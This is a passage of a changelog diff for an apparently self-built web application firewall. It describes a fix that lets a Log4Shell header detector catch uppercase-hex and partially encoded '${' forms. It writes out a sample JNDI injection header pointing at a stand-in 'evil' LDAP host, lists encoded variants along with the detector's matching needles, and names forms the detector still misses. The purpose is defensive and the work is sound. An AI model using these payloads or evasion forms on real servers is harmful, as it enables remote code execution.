@@ -18,6 +18,22 @@ back-filled here — see the git/PR history for that period.
 ## [Unreleased]
 
 ### Security
+- **Log4Shell header detector now catches every single-encoded form of `${` (F35).**
+  `detect_log4shell` (rule 328 `WAF_CVE:LOG4SHELL`, logonly) prechecks each
+  request header for a `${` before decoding, but the gate was **narrower than its
+  own decoder**: it admitted only the fully-encoded `%24%7b` (lowercase-hex),
+  while the decode+match two lines below flags *anything* that one-pass-decodes
+  to a `${…}` lookup. So a header like `User-Agent: %24%7Bjndi:ldap://evil/a%7D`
+  (uppercase hex — what `curl` emits) and the partial forms `%24{jndi:` /
+  `$%7bjndi:` / `$%7Bjndi:` all decode to `${jndi:` but were skipped before the
+  match ever ran. The gate now admits all six single-`%xx`-encoded adjacency
+  forms of `${` via four plain needles (`${`, `%24%7`, `%24{`, `$%7`) — kept as
+  substring finds so no per-header lowercase copy is allocated on the hot path,
+  and FP-neutral because the decode+match remains the sole hit-decider. The
+  args/body path was already unaffected (`normalize` double-decodes); double-
+  encoded (`%2524%257b…`) and `%u007b` forms don't one-pass-decode to `${` and
+  remain the documented args/body-normalize asymmetry. Found by the 2026-07 edge
+  Lua audit (F35, low).
 - **WAF CRLF detector now catches canonically-capitalized header injections
   (F34).** The raw-CR/LF branch of `detect_crlf_injection` (rule 605 `WAF_CRLF`,
   challenge tier) matched the lowercase header-name literals (`set-cookie`,
